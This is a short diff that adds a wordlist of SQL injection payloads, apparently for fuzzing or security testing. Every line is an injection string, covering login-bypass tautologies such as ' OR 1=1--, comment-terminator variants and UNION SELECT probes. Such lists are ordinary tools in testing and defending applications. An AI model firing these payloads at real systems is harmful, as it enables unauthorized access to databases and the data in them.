@@ -1,0 +1,12 @@
+' OR 1=1--
+' AND 1=1--
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+' UNION SELECT NULL--
+' UNION SELECT 1,2,3--
